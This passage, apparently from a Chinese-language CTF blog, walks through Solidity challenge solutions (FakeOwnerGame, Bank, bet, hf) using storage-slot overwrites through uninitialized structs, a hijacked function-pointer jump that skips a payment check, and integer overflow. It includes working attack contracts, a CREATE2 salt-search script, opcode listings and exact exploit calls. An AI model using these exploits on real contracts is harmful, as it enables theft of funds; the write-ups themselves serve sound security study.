address(this).balance)&#123;</span><br><span class="line">            owner = msg.sender;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function revise(uint idx, bytes32 tmp) &#123;</span><br><span class="line">         if(uint(msg.sender) &amp; 0x61 == 0x61 &amp;&amp; tx.origin != msg.sender) &#123;</span><br><span class="line">            codex[idx] = tmp;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Analyse-1"><a href="#Analyse-1" class="headerlink" title="Analyse"></a>Analyse</h3><p>题目要求我们余额大于2000，且是owner。其实很简单就是有点绕，余额大于两千我们就进行settle就可以了。但是成为owner就不简单了，我们看到了beOwner，好像很简单的就能成为owner,但是这个函数就是骗人的，永远没法msg.value &gt; address(this).balance。那么我们再看revise函数，它可以设置bytes32[] public codex的值。似乎我们可以利用它来覆盖slot槽，但是我们的数组长度也没这么长啊，我们还要想办法将数组长度变长。在settle中似乎存在一个未初始化的数组，它的后两个值（bytes12 hash；address msgsender;）似乎正位于数组长度的槽。然后经过计算我们发现msgsender的前两位必须大于fb才可以使得数组足够大。slot是从右往左排的。</p><p>即slot:———————–msg.sender—————-hash—————-:           bytse32</p><p>那么我们就creat2就可以了。</p><h3 id="Attack-2"><a href="#Attack-2" class="headerlink" title="Attack"></a>Attack</h3><p>Step</p><ol><li>部署Deploy</li><li>用py寻找到0xfc…………61的地址的salt,然后用creat2部署Attack;</li><li>先init，然后attack1</li><li>一直调用attack2，直到结构体修改为止</li><li>调用findslot修改owner。然后所有要求就完成了</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface FakeOwnerGame&#123;</span><br><span class="line">    function lockInGuess(uint8 n) external payable;</span><br><span class="line">    function settle() external;</span><br><span class="line">    function revise(uint idx, bytes32 tmp)external;</span><br><span class="line">&#125;</span><br><span class="line">contract Attack&#123;</span><br><span class="line">    uint a=5;</span><br><span class="line">    FakeOwnerGame target;</span><br><span class="line"></span><br><span class="line">     function init(address add)public&#123;</span><br><span class="line">        target=FakeOwnerGame(add);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack1()public payable&#123;</span><br><span class="line">        require(msg.value==1 ether);</span><br><span class="line">        target.lockInGuess&#123;value:1 ether&#125;(1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack2()public &#123;</span><br><span class="line">            target.settle();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function findslot()public returns(bytes32)&#123;</span><br><span class="line">        uint slot=2**256-1-uint(keccak256(abi.encodePacked(a)))+7;</span><br><span class="line">        target.revise(slot,bytes32(uint(uint160((address(msg.sender))))));</span><br><span class="line">        return bytes32(slot);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract Deploy&#123;</span><br><span class="line">     Attack public _contract;</span><br><span class="line">    function getcode()public pure returns(bytes memory)&#123;</span><br><span class="line">        bytes memory bytecode =type(Attack).creationCode;</span><br><span class="line">        return bytecode;</span><br><span class="line">    &#125;</span><br><span class="line">    function deploy(uint salt)public returns(address add)&#123;</span><br><span class="line">        _contract=new Attack&#123;salt:bytes32(salt)&#125;();</span><br><span class="line">        add=address(_contract);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">// 114245411204874937970903528273105092893277201882823832116766311725579567940182 owner槽的位置</span><br><span class="line">from web3 import Web3, HTTPProvider</span><br><span class="line"></span><br><span class="line">deployingAddr = &#x27;A64F13F05479C8d1eB5adF6cDB85fA2303CcFC0f&#x27;</span><br><span class="line"></span><br><span class="line">code = &#x27;0x608060405260055f55348015610013575f80fd5b5061058b806100215f395ff3fe608060405260043610610042575f3560e01c8063171953301461004557806319ab453c1461006f578063419efc03146100975780639fcec698146100a157610043565b5b005b348015610050575f80fd5b506100596100b7565b6040516100669190610340565b60405180910390f35b34801561007a575f80fd5b50610095600480360381019061009091906103b7565b6101c0565b005b61009f610203565b005b3480156100ac575f80fd5b506100b56102aa565b005b5f8060075f546040516020016100cd919061040b565b604051602081830303815290604052805190602001205f1c7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff6101109190610452565b61011a9190610485565b905060015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16630339f300823360601b6bffffffffffffffffffffffff19166040518363ffffffff1660e01b815260040161018a9291906104c7565b5f604051808303815f87803b1580156101a1575f80fd5b505af11580156101b3573d5f803e3d5ffd5b50505050805f1b91505090565b8060015f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b670de0b6b3a76400003414610216575f80fd5b60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632c0e0054670de0b6b3a764000060016040518363ffffffff1660e01b815260040161027a919061053c565b5f604051808303818588803b158015610291575f80fd5b505af11580156102a3573d5f803e3d5ffd5b5050505050565b60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166311da60b46040518163ffffffff1660e01b81526004015f604051808303815f87803b158015610310575f80fd5b505af1158015610322573d5f803e3d5ffd5b50505050565b5f819050919050565b61033a81610328565b82525050565b5f6020820190506103535f830184610331565b92915050565b5f80fd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6103868261035d565b9050919050565b6103968161037c565b81146103a0575f80fd5b50565b5f813590506103b18161038d565b92915050565b5f602082840312156103cc576103cb610359565b5b5f6103d9848285016103a3565b91505092915050565b5f819050919050565b5f819050919050565b610405610400826103e2565b6103eb565b82525050565b5f61041682846103f4565b60208201915081905092915050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601160045260245ffd5b5f61045c826103e2565b9150610467836103e2565b925082820390508181111561047f5761047e610425565b5b92915050565b5f61048f826103e2565b915061049a836103e2565b92508282019050808211156104b2576104b1610425565b5b92915050565b6104c1816103e2565b82525050565b5f6040820190506104da5f8301856104b8565b6104e76020830184610331565b9392505050565b5f819050919050565b5f60ff82169050919050565b5f819050919050565b5f61052661052161051c846104ee565b610503565b6104f7565b9050919050565b6105368161050c565b82525050565b5f60208201905061054f5f83018461052d565b9291505056fea2646970667358221220226014c11c2827793bfe1f14fb40e6c9da3f7719bb13e63747b9c4dc2a0b7f9f64736f6c63430008140033&#x27;</span><br><span class="line"></span><br><span class="line">s = Web3.keccak(hexstr=code)</span><br><span class="line">print(s)</span><br><span class="line">a = &#x27;&#x27;.join([&#x27;%02x&#x27; % b for b in s])</span><br><span class="line">print(a)</span><br><span class="line">i = 0</span><br><span class="line">while (1):</span><br><span class="line">    # 去掉0x,并且补充到bytes32位</span><br><span class="line">    salt = hex(i)[2:].rjust(64, &#x27;0&#x27;)</span><br><span class="line">    p = Web3.keccak(hexstr=(&#x27;0xff&#x27; + deployingAddr + salt + a))[12:].hex()</span><br><span class="line">    if p.startswith(&quot;0xfc&quot;)&amp;p.endswith(&quot;61&quot;):</span><br><span class="line">         print(salt, p)</span><br><span class="line">         break</span><br><span class="line">    i += 1</span><br><span class="line">print(int(salt,16))</span><br></pre></td></tr></table></figure><h2 id="0x04bank"><a href="#0x04bank" class="headerlink" title="0x04bank"></a>0x04bank</h2><h3 id="Code-2"><a href="#Code-2" class="headerlink" title="Code"></a>Code</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.24;</span><br><span class="line"></span><br><span class="line">contract Bank &#123;</span><br><span class="line">    event SendEther(address addr);</span><br><span class="line">    event SendFlag(address addr);</span><br><span class="line"></span><br><span class="line">    address public owner;//slot 0</span><br><span class="line">    uint randomNumber = 0;//slot 1</span><br><span class="line">    constructor() public &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    struct SafeBox &#123;</span><br><span class="line">        bool done;</span><br><span class="line">        function(uint, bytes12) internal callback;//bytes8</span><br><span class="line">        bytes12 hash;</span><br><span class="line">        uint value;</span><br><span class="line">    &#125;</span><br><span class="line">    SafeBox[] safeboxes;// slot 2</span><br><span class="line"></span><br><span class="line">    struct FailedAttempt &#123;</span><br><span class="line">        uint idx;</span><br><span class="line">        uint time;</span><br><span class="line">        bytes12 triedPass;</span><br><span class="line">        address origin;</span><br><span class="line">    &#125;</span><br><span class="line">    mapping(address =&gt; FailedAttempt[]) failedLogs;//slot 3</span><br><span class="line"></span><br><span class="line">    modifier onlyPass(uint idx, bytes12 pass) &#123;</span><br><span class="line">        if (bytes12(sha3(pass)) != safeboxes[idx].hash) &#123;</span><br><span class="line">            FailedAttempt info;// ld</span><br><span class="line">            info.idx = idx;</span><br><span class="line">            info.time = now;</span><br><span class="line">            info.triedPass = pass;</span><br><span class="line">            info.origin = tx.origin;</span><br><span class="line">            failedLogs[msg.sender].push(info);</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            _;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function deposit(bytes12 hash) payable public returns(uint) &#123;</span><br><span class="line">        SafeBox box; //ld</span><br><span class="line">        box.done = false;</span><br><span class="line">        box.hash = hash;</span><br><span class="line">        box.value = msg.value;</span><br><span class="line">        if (msg.sender == owner) &#123;</span><br><span class="line">            box.callback = sendFlag;</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            require(msg.value &gt;= 1 ether);</span><br><span class="line">            box.value -= 0.01 ether;</span><br><span class="line">            box.callback = sendEther;</span><br><span class="line">        &#125;</span><br><span class="line">        safeboxes.push(box);</span><br><span class="line">        return safeboxes.length-1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint idx, bytes12 pass) public payable &#123;</span><br><span class="line">        SafeBox box = safeboxes[idx];</span><br><span class="line">        require(!box.done);</span><br><span class="line">        box.callback(idx, pass);</span><br><span class="line">        box.done = true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function sendEther(uint idx, bytes12 pass) internal onlyPass(idx, pass) &#123;</span><br><span class="line">        msg.sender.transfer(safeboxes[idx].value);</span><br><span class="line">        emit SendEther(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function sendFlag(uint idx, bytes12 pass) internal onlyPass(idx, pass) &#123;</span><br><span class="line">        require(msg.value &gt;= 100000000 ether);</span><br><span class="line">        emit SendFlag(msg.sender);</span><br><span class="line">        selfdestruct(owner);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Analyse-2"><a href="#Analyse-2" class="headerlink" title="Analyse"></a>Analyse</h3><p>题目分析：</p><p>这一题是比较好且好玩的一题。我们要完成合约需要调用内部合约sendFlag（）且传入100000000 ether才能完成，但是不太可能。那么我们一步一步的来，合约中存在结构体覆盖的漏洞，onlyPass中可以覆盖到数组的长度的槽，因此我们数组长度变大，可以覆盖其他的槽。但是这有什么用能？我们发现withdraw可以调用box.callback,即可以跳转到callback(bytes8)对应的函数JUMPDEST。那么我们可以跳转到sendFlag（）函数里面，但是我们还要支付100000000 ether。那么我们会想可不可以绕过支付钱这一步，而是直接跳转到emit SendFlag(msg.sender)？那么我们需要找到合约对应的最基础的操作</p><p>​        06F4    56    *JUMP        06F5    5B    JUMPDEST        06F6    6A    PUSH11 0x52b7d2dcc80cd2e4000000        0702    34    CALLVALUE        0703    10    LT        0704    15    ISZERO        0705    15    ISZERO        0706    15    ISZERO        0707    61    PUSH2 0x070f        070A    57    *JUMPI        070B    60    PUSH1 0x00        070D    80    DUP1        070E    FD    *REVERT        070F    5B    JUMPDEST        0710    7F    PUSH32</p><p>0x2d3bd82a572c860ef85a36e8d4873a9deed3f76b9fddbf13fbe4fe8a97c4a579</p><p>​        0731    33    CALLER</p><p>这是对合约字节码反编译时发现的，我们看到在06F5（这一步正是callback的值对应的跳转地）时跳转目的地sendFlag（）函数,在06F6时push了100000000 ether，在070F时又进行了跳转目的地，该目的地正是emit SendFlag(msg.sender)。那么我们会想如果我们直接跳转到070F那么不就成功绕过100000000 ether这个条件了？</p><p>所以我们要想方设法更改callback它的值。</p><p>如何更改callback:</p><p>这里就用到了我们刚刚提到的结构体覆盖漏洞了。我们调用deposit函数并且传入1ether,成功的为withdraw的调用做准备。然后我们调用withdraw，我会进入onlyPass,导致槽被覆盖，同时存入一个自定义的bytes12 pass,并且储存到映射结构体数组中，我们分别看一下两个数组占用的储存位置</p><p>safeBox:</p><p>-—————————————————-</p><blockquote><p>unused (11) | hash (12) | callback (8) | done (1) |    1</p></blockquote><p>-—————————————————-</p><blockquote><p>​                    value (32)                    |                    2</p></blockquote><p>-—————————————————-</p><p>FailedAttempt</p><p>-—————————————————-</p><blockquote><p>​                     idx (32)                     |                      1</p></blockquote><p>-—————————————————-</p><blockquote><p>​                    time (32)                     |                      2</p></blockquote><p>-—————————————————-</p><blockquote><p>​         origin (20)         |   triedPass (12)   |                 3</p></blockquote><p>-—————————————————-</p><p>我们知道triedPass 是我们自定义的，而它所在的位置也包含了callback ，因此我们可以通过更改triedPass的值，使其数组SafeBox[] safeboxes的特定索引可以找到其对应的值，然后取callback的时候取走的是triedPass的部分值，使这部分值为000000000000070F；从而完成跳转，完成合约。</p><p>需要注意的是:</p><p>1.我们必须要寻找到符合的msg.sender使safeBox的第一个槽恰恰好可以在FailedAttempt的第三个槽的位置，而不是safeBox的第二个槽在FailedAttempt的第三个槽的位置。</p><p>2.我们数组长度要尽可能长点，否则没法寻找到映射结构体数组的位置，因此我们的msg.sender的前几位要大于最小长度的前几位。要满足这个条件应该很容易。</p><h3 id="Attack-3"><a href="#Attack-3" class="headerlink" title="Attack"></a>Attack</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">contract Attack&#123;</span><br><span class="line">    Bank target;</span><br><span class="line">    uint public v=uint(0x3b1cc29c72f9df2b628a8d6a5e6f1ee64e672d27a5e07b27d5010855efd2cdf8);</span><br><span class="line">    constructor(address add)payable&#123;</span><br><span class="line">        target=Bank(add);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    function Arrystart()public pure returns(uint)&#123;//数组的起始位置</span><br><span class="line">        bytes32 a=keccak256(bytes32(2));</span><br><span class="line">        return uint(a);</span><br><span class="line">    &#125;</span><br><span class="line">    function Mapstart()public view returns(uint)&#123;//映射结构体数组的起始位置</span><br><span class="line">        bytes32 a=keccak256(keccak256(abi.encodePacked(bytes32(address(msg.sender)),bytes32(3))));</span><br><span class="line">        return uint(a);</span><br><span class="line">    &#125;</span><br><span class="line">    function find()public view returns(uint)&#123;//恰好可以覆盖的最小长度  ==  也是我们需要的索引值。</span><br><span class="line">        uint a=(Mapstart()-Arrystart())%2;</span><br><span class="line">        require(a==0,&quot;failed&quot;);</span><br><span class="line">        uint b=(Mapstart()-Arrystart())/2+1;</span><br><span class="line">        return b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后开始攻击：</p><ol><li><p>deposit(0x000000000000000000000000){value:1 ether};  设置callback为sendEther,为下一步deposit进入onlyPass做准备</p></li><li><p>withdraw(0,0x111111000000000000070F00):  1的位置随便填，这一步完成了数组长度的覆盖，并且也设置好了未来的callback的值（bytes8:000000000000070F），可谓点睛之笔;</p></li><li><p>withdraw(index,0x000000000000000000000000):  index是我们寻找到的，数组覆盖映射结构体数组的特定index,此时特定index的callback就是tiredPass的一部分，也就是000000000000070F，然后通过callback直接绕过100000000 ether,直接发送事件，并且自毁，然后完成题目！！！！！！！！！！！！！</p></li></ol><p>考察点：主要考察的是字节码的跳转，要理解字节码的运作原理以及跳转的运作原理，同时要注意结构体的覆盖，以及数组的覆盖，利用它们可以取到任何我们想要的值，只要给我们一个可以更改值的槽，我们就可以在合约中得到任意我们想要的值，从而使得我们拥有很大的操作空间。</p><h1 id="Integer-overflow"><a href="#Integer-overflow" class="headerlink" title="Integer overflow"></a>Integer overflow</h1><h2 id="0x01bet"><a href="#0x01bet" class="headerlink" title="0x01bet"></a>0x01bet</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.24;</span><br><span class="line"></span><br><span class="line">contract bet &#123;</span><br><span class="line">    uint secret;</span><br><span class="line">    address owner;</span><br><span class="line">    </span><br><span class="line">    mapping(address =&gt; uint) public balanceOf;</span><br><span class="line">    mapping(address =&gt; uint) public gift;</span><br><span class="line">    mapping(address =&gt; uint) public isbet;</span><br><span class="line">    </span><br><span class="line">    event SendFlag(string b64email);</span><br><span class="line">    </span><br><span class="line">    function Bet() public&#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function payforflag(string b64email) public &#123;</span><br><span class="line">        require(balanceOf[msg.sender] &gt;= 100000);</span><br><span class="line">        balanceOf[msg.sender]=0;</span><br><span class="line">        owner.transfer(address(this).balance);</span><br><span class="line">        emit SendFlag(b64email);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    //to fuck</span><br><span class="line">    </span><br><span class="line">    modifier only_owner() &#123;</span><br><span class="line">        require(msg.sender == owner);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function setsecret(uint secretrcv) only_owner &#123;</span><br><span class="line">        secret=secretrcv;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function deposit() payable&#123;</span><br><span class="line">        uint geteth=msg.value/1000000000000000000;</span><br><span class="line">        balanceOf[msg.sender]+=geteth;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function profit() &#123;</span><br><span class="line">        require(gift[msg.sender]==0);</span><br><span class="line">        gift[msg.sender]=1;</span><br><span class="line">        balanceOf[msg.sender]+=1;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function betgame(uint secretguess)&#123;</span><br><span class="line">        require(balanceOf[msg.sender]&gt;0);</span><br><span class="line">        balanceOf[msg.sender]-=1;</span><br><span class="line">        if (secretguess==secret)</span><br><span class="line">        &#123;</span><br><span class="line">            balanceOf[msg.sender]+=2;</span><br><span class="line">            isbet[msg.sender]=1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function doublebetgame(uint secretguess) only_owner&#123;</span><br><span class="line">        require(balanceOf[msg.sender]-2&gt;0);</span><br><span class="line">        require(isbet[msg.sender]==1);</span><br><span class="line">        balanceOf[msg.sender]-=2;</span><br><span class="line">        if (secretguess==secret)</span><br><span class="line">        &#123;</span><br><span class="line">            balanceOf[msg.sender]+=2;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单的一批，Bet随便调用，直接用doublebetgame溢出就可以了</p><h2 id="0x02hf"><a href="#0x02hf" class="headerlink" title="0x02hf"></a>0x02hf</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.24;</span><br><span class="line"></span><br><span class="line">contract hf &#123;</span><br><span class="line">    address secret;</span><br><span class="line">    uint count;</span><br><span class="line">    address owner;</span><br><span class="line">    </span><br><span class="line">    mapping(address =&gt; uint) public balanceOf;</span><br><span class="line">    mapping(address =&gt; uint) public gift;</span><br><span class="line">    </span><br><span class="line">    struct node &#123;</span><br><span class="line">        address nodeadress;</span><br><span class="line">        uint nodenumber;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    node public node0;</span><br><span class="line">    </span><br><span class="line">    event SendFlag(string b64email);</span><br><span class="line">    </span><br><span class="line">    constructor()public&#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function payforflag(string b64email) public &#123;</span><br><span class="line">        require(balanceOf[msg.sender] &gt;= 100000);</span><br><span class="line">        balanceOf[msg.sender]=0;</span><br><span class="line">        owner.transfer(address(this).balance);</span><br><span class="line">        emit SendFlag(b64email);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    //to fuck</span><br><span class="line">    </span><br><span class="line">    modifier onlySecret() &#123;</span><br><span class="line">        require(msg.sender == secret);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function profit() public&#123;</span><br><span class="line">        require(gift[msg.sender]==0);</span><br><span class="line">        gift[msg.sender]=1;</span><br><span class="line">        balanceOf[msg.sender]+=1;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function hfvote() public payable&#123;</span><br><span class="line">        uint geteth=msg.value/1000000000000000000;</span><br><span class="line">        balanceOf[msg.sender]+=geteth;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function ubw() public payable&#123;</span><br><span class="line">        if (msg.value &lt; 2 ether)</span><br><span class="line">        &#123;</span><br><span class="line">            node storage n = node0;</span><br><span class="line">            n.nodeadress=msg.sender;</span><br><span class="line">            n.nodenumber=1;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            n.nodeadress=msg.sender;</span><br><span class="line">            n.nodenumber=2;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function fate(address to,uint value) public onlySecret &#123;</span><br><span class="line">        require(balanceOf[msg.sender]-value&gt;=0);</span><br><span class="line">        balanceOf[msg.sender]-=value;</span><br><span class="line">        balanceOf[to]+=value;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结构体为初始化，覆盖secret,然后fate溢出就可以了。</p><h1 id="Delegatecall"><a href="#Delegatecall" class="headerlink" title="Delegatecall"></a>Delegatecall</h1><h2 id="0x01Counterstrike"><a href="#0x01Counterstrike" class="headerlink" title="0x01Counterstrike"></a>0x01Counterstrike</h2><h3 id="Code-3"><a href="#Code-3" class="headerlink" title="Code"></a>Code</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span 